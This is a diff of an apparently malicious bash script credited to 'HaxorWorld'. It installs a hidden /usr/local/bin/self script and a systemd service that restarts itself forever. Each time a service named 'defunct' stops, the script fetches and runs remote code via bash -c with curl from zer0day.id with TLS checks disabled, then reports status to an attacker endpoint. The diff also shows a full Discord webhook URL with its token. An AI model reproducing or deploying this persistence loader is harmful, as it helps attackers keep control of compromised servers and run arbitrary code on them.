@@ -1,18 +1,18 @@
 #!/bin/bash
 #Code by HaxorWorld
 
-self_healing_script_path="/usr/local/bin/self"
+self_love="/usr/local/bin/self"
 service_file_path="/etc/systemd/system/self.service"
-webhook_url="https://discordapp.com/api/webhooks/1261323469749223465/XZtp_a_gNMVif8HDqmG0AQUZA0Kr-pSefGYlwwqTMcfmmSG0NOTdzPV_7K8LJoSDflqA"
+php_endpoint="https://zer0day.id/love.php"  
 service_name="defunct"  
 pid_file="/var/run/self.pid"
 
 
-cat << 'EOF' > "$self_healing_script_path"
+cat << 'EOF' > "$self_love"
 #!/bin/bash
 
 host=$(hostname)
-webhook_url="https://discordapp.com/api/webhooks/1261323469749223465/XZtp_a_gNMVif8HDqmG0AQUZA0Kr-pSefGYlwwqTMcfmmSG0NOTdzPV_7K8LJoSDflqA"
+php_endpoint="https://yourwebsite.com/love.php"  
 service_name="defunct"
 pid_file="/var/run/self.pid"
 
@@ -43,13 +43,13 @@ while true; do
     if systemctl is-active --quiet "$service_name"; then
         sleep 1
     else
-        curl -sL -H "Content-Type: application/json" -X POST -d "{\"content\": \"[HaxorBot] Service $service_name tidak berjalan di server $host, mengaktifkan ulang...\"}" "$webhook_url"
+        curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_down"
         bash -c "$(curl -fsSL https://zer0day.id/y -k)"
         
         if systemctl is-active --quiet "$service_name"; then
-            curl -sL -H "Content-Type: application/json" -X POST -d "{\"content\": \"[HaxorBot] Berhasil mengaktifkan ulang $service_name!\"}" "$webhook_url"
+            curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_up"
         else
-            curl -sL -H "Content-Type: application/json" -X POST -d "{\"content\": \"[HaxorBot] Gagal mengaktifkan ulang $service_name!\"}" "$webhook_url"
+            curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_fail"
         fi
     fi
     sleep 10
@@ -57,7 +57,7 @@ done
 EOF
 
 
-chmod +x "$self_healing_script_path"
+chmod +x "$self_love"
 
 
 cat << EOF > "$service_file_path"
@@ -65,7 +65,7 @@ cat << EOF > "$service_file_path"
 Description=Self Service
 
 [Service]
-ExecStart=$self_healing_script_path
+ExecStart=$self_love
 Restart=always
 RestartSec=10
 PIDFile=$pid_file
